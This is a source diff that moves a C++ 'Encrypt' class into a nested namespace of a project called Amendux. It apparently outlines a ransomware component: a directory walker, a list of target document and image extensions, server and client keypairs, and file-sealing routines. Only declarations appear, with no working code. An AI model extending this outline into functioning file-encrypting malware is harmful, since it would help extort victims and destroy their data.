@@ -4,38 +4,41 @@
 
 namespace Amendux {
 
-	class Encrypt
-	{
-	private:
-		const char *extensions[10] = { "doc", "docx", "jpg", "png", "xls", "xlsx", "ppt", "pptx", "txt" };
+	namespace Module {
 
-		unsigned char serverPublicKey[crypto_box_PUBLICKEYBYTES];
-		unsigned char serverSecretKey[crypto_box_SECRETKEYBYTES];
-		unsigned char clientPublicKey[crypto_box_PUBLICKEYBYTES];
-		unsigned char clientSecretKey[crypto_box_SECRETKEYBYTES];
+		class Encrypt //TODO inherit module
+		{
+		private:
+			const char *extensions[10] = { "doc", "docx", "jpg", "png", "xls", "xlsx", "ppt", "pptx", "txt" };
 
-		void getDirFiles(std::wstring szDir);
-		bool isExtensionMatch(const std::wstring& file);
-		bool boxSeal(std::wstring file);
-		bool boxUnseal();
+			unsigned char serverPublicKey[crypto_box_PUBLICKEYBYTES];
+			unsigned char serverSecretKey[crypto_box_SECRETKEYBYTES];
+			unsigned char clientPublicKey[crypto_box_PUBLICKEYBYTES];
+			unsigned char clientSecretKey[crypto_box_SECRETKEYBYTES];
 
-	public:
-		Encrypt();
-		~Encrypt();
+			void getDirFiles(std::wstring szDir);
+			bool isExtensionMatch(const std::wstring& file);
+			bool boxSeal(std::wstring file);
+			bool boxUnseal();
 
-		static void Encrypt::rot13(char str[]);
+		public:
+			Encrypt();
+			~Encrypt();
 
-		unsigned char *clientPublickey() {
-			return clientPublicKey;
-		}
+			static void Encrypt::rot13(char str[]);
 
-		unsigned char *clientPrivatekey() {
-			return clientSecretKey;
-		}
+			unsigned char *clientPublickey() {
+				return clientPublicKey;
+			}
 
-		void Run();
-		void genLocalKeypair();
-		void setLocalKeypair(unsigned char *publickey, unsigned char *privatekey);
-	};
+			unsigned char *clientPrivatekey() {
+				return clientSecretKey;
+			}
 
+			void Run();
+			void genLocalKeypair();
+			void setLocalKeypair(unsigned char *publickey, unsigned char *privatekey);
+		};
+
+	}
 }
